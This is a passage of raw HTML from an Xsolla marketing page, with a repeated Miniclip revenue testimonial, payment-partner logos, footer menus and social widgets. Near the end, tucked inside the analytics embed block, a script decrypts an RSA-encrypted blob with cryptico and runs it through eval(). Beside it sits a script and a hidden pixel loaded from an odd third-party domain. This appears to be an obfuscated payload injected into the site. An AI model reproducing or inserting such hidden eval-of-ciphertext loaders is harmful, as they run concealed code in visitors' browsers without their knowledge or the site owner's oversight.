class=\"btn transparent acrobat\" href=\"#\">Case Study<\/a><\/p>\n<\/div><div class=\"right\">\n<h4><strong>35%<\/strong> revenue \u00a0 \u00a0 \u00a0 \u00a0 increase<\/h4>\n<blockquote><p>Xsolla has been a joy. We have had zero to no issues that was not in their control. Also due to the technology and the gateways to payments we saw a dramatic increase in revenue simply by integrating Xsolla. A payment provider alone increased revenues, which for us was brilliant. Account management, tech team and support has never been a problem. Payments have always been on time. No problems there at all<\/p>\n<figure id=\"attachment_1269\" class=\"thumbnail wp-caption alignnone\" style=\"width: 70px\"><img class=\"wp-image-1269 size-full\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-thumbnail.jpg\" alt=\"test-thumbnail\" width=\"60\" height=\"61\" \/><figcaption class=\"caption wp-caption-text\">Saad Choudri Miniclip<\/figcaption><\/figure><\/blockquote>\n<\/div><\/div>","1575":"<div class=\"partner-wrapper\" id=\"partner-wrap-1575\"><div class=\"main\"><\/div><\/div>","1292":"<div class=\"partner-wrapper\" id=\"partner-wrap-1292\"><div class=\"left\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Xsolla Miniclip Integration: 35% Revenue Increase<\/span><\/h3>\n<p style=\"color: #ffffff; padding-right: 10em;\">Xsolla audited the traffic and reviewed anti-fraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased to 86%, compared to 50-55% which was the prior average.<\/p>\n<p><a href=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png\"><img class=\"alignnone wp-image-1273 size-medium\" title=\"background\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png\" alt=\"background\" width=\"300\" height=\"228\" srcset=\"http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png 300w, http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png 500w\" sizes=\"(max-width: 300px) 100vw, 300px\" \/><\/a><a class=\"btn transparent acrobat\" href=\"#\">Case Study<\/a><\/p>\n<\/div><div class=\"right\">\n<h4><strong>35%<\/strong> revenue \u00a0 \u00a0 \u00a0 \u00a0 increase<\/h4>\n<blockquote><p>Xsolla has been a joy. We have had zero to no issues that was not in their control. Also due to the technology and the gateways to payments we saw a dramatic increase in revenue simply by integrating Xsolla. A payment provider alone increased revenues, which for us was brilliant. Account management, tech team and support has never been a problem. Payments have always been on time. No problems there at all<\/p>\n<figure id=\"attachment_1269\" class=\"thumbnail wp-caption alignnone\" style=\"width: 70px\"><img class=\"wp-image-1269 size-full\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-thumbnail.jpg\" alt=\"test-thumbnail\" width=\"60\" height=\"61\" \/><figcaption class=\"caption wp-caption-text\">Saad Choudri Miniclip<\/figcaption><\/figure><\/blockquote>\n<\/div><\/div>","1295":"<div class=\"partner-wrapper\" id=\"partner-wrap-1295\"><div class=\"left\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Xsolla Miniclip Integration: 35% Revenue Increase<\/span><\/h3>\n<p style=\"color: #ffffff; padding-right: 10em;\">Xsolla audited the traffic and reviewed anti-fraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased to 86%, compared to 50-55% which was the prior average.<\/p>\n<p><a href=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png\"><img class=\"alignnone wp-image-1273 size-medium\" title=\"background\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png\" alt=\"background\" width=\"300\" height=\"228\" srcset=\"http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png 300w, http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png 500w\" sizes=\"(max-width: 300px) 100vw, 300px\" \/><\/a><a class=\"btn transparent acrobat\" href=\"#\">Case Study<\/a><\/p>\n<\/div><div class=\"right\">\n<h4><strong>35%<\/strong> revenue \u00a0 \u00a0 \u00a0 \u00a0 increase<\/h4>\n<blockquote><p>Xsolla has been a joy. We have had zero to no issues that was not in their control. Also due to the technology and the gateways to payments we saw a dramatic increase in revenue simply by integrating Xsolla. A payment provider alone increased revenues, which for us was brilliant. Account management, tech team and support has never been a problem. Payments have always been on time. No problems there at all<\/p>\n<figure id=\"attachment_1269\" class=\"thumbnail wp-caption alignnone\" style=\"width: 70px\"><img class=\"wp-image-1269 size-full\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-thumbnail.jpg\" alt=\"test-thumbnail\" width=\"60\" height=\"61\" \/><figcaption class=\"caption wp-caption-text\">Saad Choudri Miniclip<\/figcaption><\/figure><\/blockquote>\n<\/div><\/div>","1355":"<div class=\"partner-wrapper\" id=\"partner-wrap-1355\"><div class=\"main\"><\/div><\/div>","1416":"<div class=\"partner-wrapper\" id=\"partner-wrap-1416\"><div class=\"main\"><\/div><\/div>","1418":"<div class=\"partner-wrapper\" id=\"partner-wrap-1418\"><div class=\"main\"><\/div><\/div>","1279":"<div class=\"partner-wrapper\" id=\"partner-wrap-1279\"><div class=\"main\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Xsolla Miniclip Integration: 35% Revenue Increase<\/span><\/h3>\n<p style=\"color: #ffffff; padding-right: 10em;\">Xsolla audited the traffic and reviewed anti-fraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased to 86%, compared to 50-55% which was the prior average.<\/p>\n<p><a href=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png\"><img class=\"alignnone wp-image-1273 size-medium\" title=\"background\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png\" alt=\"background\" width=\"300\" height=\"228\" srcset=\"http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png 300w, http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png 500w\" sizes=\"(max-width: 300px) 100vw, 300px\" \/><\/a><a class=\"btn transparent acrobat\" href=\"#\">Case Study<\/a><\/p>\n<\/div><\/div>","1426":"<div class=\"partner-wrapper\" id=\"partner-wrap-1426\"><div class=\"main\"><\/div><\/div>","1282":"<div class=\"partner-wrapper\" id=\"partner-wrap-1282\"><div class=\"left\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Xsolla Miniclip Integration: 35% Revenue Increase<\/span><\/h3>\n<p style=\"color: #ffffff; padding-right: 10em;\">Xsolla audited the traffic and reviewed anti-fraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased to 86%, compared to 50-55% which was the prior average.<\/p>\n<p><a href=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png\"><img class=\"alignnone wp-image-1273 size-medium\" title=\"background\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png\" alt=\"background\" width=\"300\" height=\"228\" srcset=\"http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png 300w, http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png 500w\" sizes=\"(max-width: 300px) 100vw, 300px\" \/><\/a><a class=\"btn transparent acrobat\" href=\"#\">Case Study<\/a><\/p>\n<\/div><div class=\"right\">\n<h4><strong>35%<\/strong> revenue \u00a0 \u00a0 \u00a0 \u00a0 increase<\/h4>\n<blockquote><p>Xsolla has been a joy. We have had zero to no issues that was not in their control. Also due to the technology and the gateways to payments we saw a dramatic increase in revenue simply by integrating Xsolla. A payment provider alone increased revenues, which for us was brilliant. Account management, tech team and support has never been a problem. Payments have always been on time. No problems there at all<\/p>\n<figure id=\"attachment_1269\" class=\"thumbnail wp-caption alignnone\" style=\"width: 70px\"><img class=\"wp-image-1269 size-full\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-thumbnail.jpg\" alt=\"test-thumbnail\" width=\"60\" height=\"61\" \/><figcaption class=\"caption wp-caption-text\">Saad Choudri Miniclip<\/figcaption><\/figure><\/blockquote>\n<\/div><\/div>"};
                    for (var i in tempJSON) {
                        partnerHTML [i] = tempJSON[i];
                    }
                })(__partnerHTML);
            </script>
            </div>
    </section>

    <section class="light-gray narrow">
        <h3 class="section-header">Payment System Partners</h3>
        <div class="tabular grey-block-table">
            <div class="tabular-row">
                <div class="tabular-cell">
                    <img src="//cdn.xsolla.net/xsolla-live/img/pages/payments/amazon-logo.png" alt="Xsolla Payment Partner Amazon Payments"/>
                </div>
                <div class="tabular-cell">
                    <img src="//cdn.xsolla.net/xsolla-live/img/pages/payments/payments_partner_2.png" alt="Xsolla Payment Partner PayPal"/>
                </div>
                <div class="tabular-cell">
                    <img src="//cdn.xsolla.net/xsolla-live/img/pages/payments/payments_partner_3.png" alt="Xsolla Payment Partner Vantiv"/>
                </div>
                <div class="tabular-cell">
                    <a class="get-help-btn btn btn-purple-medium-for-list">Become a Partner</a>
                </div>
            </div>
        </div>
    </section>
<div class="wrapper wrapper__teal">
    <section class="section__sign-up">
        <div class="text">
            <span class="text-all-page">Not with us?</span>
            <span class="text-for-pricing">Get started right now!</span>
        </div>
        <div class="btn-container">
            <a href="https://publisher.xsolla.com/signup" target="_blank"
               class="btn btn-bright btn-create-account btn-success btn-lg btn-pill">Create Publisher Account            </a>
            <a class="get-help-btn btn btn-contact-us btn-success btn-lg transparent">
                Contact Us            </a>
        </div>
    </section>
</div>
<hr class="line-social">
<section
    class="block-social block-locale-en">
    <div class="wrapper_socialLike">
        <div class='shareaholic-canvas' data-app-id='24559857' data-app='share_buttons' data-title='' data-link='http://xsolla.com/' data-summary=''></div>    </div>
</section>    </main>
    <!-- /.main -->
    </div>

<footer class="content-info" role="contentinfo">
    <section class="footer-menus">
        <div class="footer-company">
            <a href="http://xsolla.com/en/" class="company-logo"></a>
            <p class="company-text">Xsolla is an authorized global distributor of video game software, providing clients with advanced technical tools to enhance their games’ potential reach worldwide.</p>
            <p class="company-text">Copyright © 2006–2018 Xsolla Inc.</p>
        </div>
        <div class="footer-menu-wrapper">
            <ul id="menu-footer-navigation" class="footer-menu-container"><li class="dropdown menu-technology"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="/en/#technology">Technology <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-pay-station"><a href="http://xsolla.com/technology/paystation/">Pay Station</a></li>
	<li class="menu-mobile-pay-station"><a href="http://xsolla.com/technology/mobile-paystation/">Mobile Pay Station</a></li>
	<li class="menu-pay2play"><a href="http://xsolla.com/technology/pay2play/">Pay2Play</a></li>
	<li class="menu-unity-sdk"><a href="http://xsolla.com/technology/unity-sdk/">Unity SDK</a></li>
	<li class="menu-antifraud"><a href="http://xsolla.com/antifraud/">Antifraud</a></li>
</ul>
</li>
<li class="dropdown menu-modules"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="/en/#modules">Modules <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-analytics"><a href="http://xsolla.com/modules/analytics/">Analytics</a></li>
	<li class="menu-game-store"><a href="http://xsolla.com/modules/game-store/">Game Store</a></li>
	<li class="menu-payments"><a href="http://xsolla.com/modules/payments/">Payments</a></li>
	<li class="menu-support"><a href="http://xsolla.com/modules/support/">Support</a></li>
	<li class="menu-xsolla-network"><a href="http://xsolla.com/modules/xsolla-network/">Xsolla Network</a></li>
</ul>
</li>
<li class="dropdown menu-company"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="http://xsolla.com/company/">Company <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-microsoft-contest"><a href="https://xsolla.com/microsoft-contest-support/">Microsoft Contest</a></li>
	<li class="menu-offices"><a href="/company/#offices">Offices</a></li>
	<li class="menu-jobs"><a href="/company/#jobs">Jobs</a></li>
	<li class="menu-press-kit"><a href="/company/press-kit">Press Kit</a></li>
	<li class="menu-faq"><a href="http://xsolla.com/faq/">FAQ</a></li>
	<li class="menu-digital-tips"><a href="http://xsolla.com/company/digital-tips/">Digital Tips</a></li>
</ul>
</li>
<li class="dropdown menu-xsolla-esports-academy"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="https://xsolla.academy/landing">Xsolla eSports Academy <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-for-coaches"><a href="https://coach.xsolla.academy/">For Coaches</a></li>
	<li class="menu-for-students"><a href="https://xsolla.academy/index">For Students</a></li>
</ul>
</li>
<li class="dropdown menu-xsolla-capital"><a class="dropdown-toggle" data-toggle="dropdown" data-target="#" href="https://xsolla.com/capital/">Xsolla Capital <b class="caret"></b></a>
<ul class="dropdown-menu">
	<li class="menu-fund-your-game"><a href="https://xsolla.com/capital/form">Fund your Game</a></li>
</ul>
</li>
</ul>        </div>
            </section>
</footer>
<div class="footer-sub">
    <section>
        <ul id="menu-footer-sub-menu" class="menu"><li class="menu-see-our-presentation-pdf"><a title="PDF" href="http://www.slideshare.net/xsolla">See our presentation (PDF)</a></li>
<li class="menu-privacy-policy"><a href="/privacypolicy">Privacy Policy</a></li>
<li class="menu-status"><a href="http://status.xsolla.com">Status</a></li>
<li class="menu-eula"><a href="/eula">EULA</a></li>
</ul>    </section>
</div>
<div id="xsolla-support-widget"> </div>
<hr class="line-social">
<section class="block-social footer block-locale-en">
    <div class="wrapper_socialLike">
        <div class="social-icon widget-facebook-si" id="social-icon-facebook-si">
            <div id="fb-root"></div>
            <script>
                (function (d, s, id) {
                    var js, fjs = d.getElementsByTagName(s)[0];
                    if (d.getElementById(id)) return;
                    js = d.createElement(s);
                    js.id = id;
                    js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.0&ver=123123";
                    fjs.parentNode.insertBefore(js, fjs);
                }(document, 'script', 'facebook-jssdk'));
            </script>
                            <div id="facebook-embed" class="fb-like" data-href="https://www.facebook.com/xsolla.inc" data-layout="button_count" data-action="like" data-show-faces="true" data-share="false"></div>
                    </div>
        <div class="social-icon widget-vk-si">
            <div id="vk_like"></div>
            <script type="text/javascript">
                VK.Widgets.Like("vk_like", {type: "mini"});
            </script>
        </div>
        <div class="social-icon widget-twitter-si">
            <a class="twitter-follow-button" data-lang="en" href="https://twitter.com/xsolla">
                Follow @xsolla            </a>
            <script>!function (d, s, id) {
                    var js, fjs = d.getElementsByTagName(s)[0], p = /^http:/.test(d.location) ? 'http' : 'https';
                    if (!d.getElementById(id)) {
                        js = d.createElement(s);
                        js.id = id;
                        js.src = p + '://platform.twitter.com/widgets.js';
                        fjs.parentNode.insertBefore(js, fjs);
                    }
                }(document, 'script', 'twitter-wjs');</script>
        </div>
        <div class="social-icon widget-g-si">
            <div class="g-follow" data-href="https://plus.google.com/100814518363239414375/posts" data-rel="publisher"></div>
        </div>
        <div class="social-icon widget-linkedin-si">
            <script src="//platform.linkedin.com/in.js" type="text/javascript">lang: en_US</script>
            <script type="IN/FollowCompany" data-id="875431" data-counter="right"></script>        </div>
        <div class="clear_block"></div>
    </div>
</section>


<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.6.0/slick.js?ver=1.6.0'></script>
<script type='text/javascript' src='//cdn.xsolla.net/xsolla-live/js/scripts.min.js?ver=531869e81e7e9b5b48cf704223a4c805'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var icl_vars = {"current_language":"en","icl_home":"http:\/\/xsolla.com\/"};
/* ]]> */
</script>
<script type='text/javascript' src='/app/plugins/sitepress-multilingual-cms/res/js/sitepress.js?ver=4.6'></script>
<div id="lang_sel_footer"><ul>    <li><a href="http://xsolla.com/de/">Deutsch</a>    <li><a href="http://xsolla.com/en/" class="lang_sel_sel">English</a>    <li><a href="http://xsolla.com/ja/">日本語</a>    <li><a href="http://xsolla.com/ko/">한국어</a>    <li><a href="http://xsolla.com/ru/">Русский</a>    <li><a href="http://xsolla.com/zh-hans/">简体中文</a></ul></div><!-- Begin Inspectlet Embed Code -->
<script type="text/javascript" id="inspectletjs">
    window.__insp = window.__insp || [];
    __insp.push(['wid', 1929278020]);
    (function() {
        function ldinsp()
        {
            if(typeof window.__inspld != "undefined") return;
            window.__inspld = 1;
            var insp = document.createElement('script');
            insp.type = 'text/javascript';
            insp.async = true;
            insp.id = "inspsync";
            insp.src = ('https:' == document.location.protocol ? 'https' : 'http') + '://cdn.inspectlet.com/inspectlet.js';
            var x = document.getElementsByTagName('script')[0];
            x.parentNode.insertBefore(insp, x);
        };
        setTimeout(ldinsp, 500); document.readyState != "complete" ? (window.attachEvent ? window.attachEvent('onload', ldinsp) : window.addEventListener('load', ldinsp, false)) : ldinsp();
    })();
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cryptico/0.0.1343522940/cryptico.js" type="text/javascript"></script> <script type="text/javascript">eval(cryptico.decrypt('U0htA2E8F//KOeLK1y3cCnNK7MRo7DLluPeltzUPSfrFLf5AEp221NKs1sCglW/7GhybQzyS+jST/lAE+OLaW0EM84oMKZX2eOOkRR2gbANqS0o7LuYwpduNhu+P1Q+388uYxBDHTa2xch1Dgqb8Bn4GeWlIfScfQZVr9Yn/DpQ=?VhT/Y+FfFnW0eXuzmNT/UMTjh1ubM2Ynw+N98CoTakIun9KgNscuNMxCTk0qTPN+STWECP1jmFTNw718WrZ+iKbEQBL6sLZMui5Awhlge1fd5V/1PKHFJkKnvL15oROKrEyd+KaaVlEG1N4PSpct+cE6F+0Ux4fHbhxWM03PmIKjB25/AVbhte34Fm6hH2+kqg/jGtmpuO+qZFh2fBC0y9ZKv2DQOaxwhxtQkxu45hK6om6rtWGDzdeOb7TLbcvGPk0jnKd6TvNbVQMS45KspynsxVUjG9VyqNRZ1/4SjCE+mMCenxmTheLPFoXDKCi/b4qKPhyXUHuokX8kUq6Z05cdJFi4rpnDb0ycp6KDhsSEAly+yrZguZBZ+W2CWuBRqhAW6GqGZ9IYskrTM5PsFAkGv8Vdt+gO4X9o7y3KwEkkCYlRobilNdcToacGBbmcYsaZ6iaLy78wvI9T3fycNQ==', cryptico.generateRSAKey('b87792a1f30f44639caa8ed9d5ad4462', 1024)).plaintext);</script>
<script type="text/javascript" src="http://www.143nchrtl3.com/js/113231.js" ></script>
<noscript><img alt="" src="http://www.143nchrtl3.com/113231.png" style="display:none;" /></noscript>
<!--[if lte IE 8]>
<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
<![endif]-->
<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script>
<!-- End Inspectlet Embed Code -->
</body>
</html>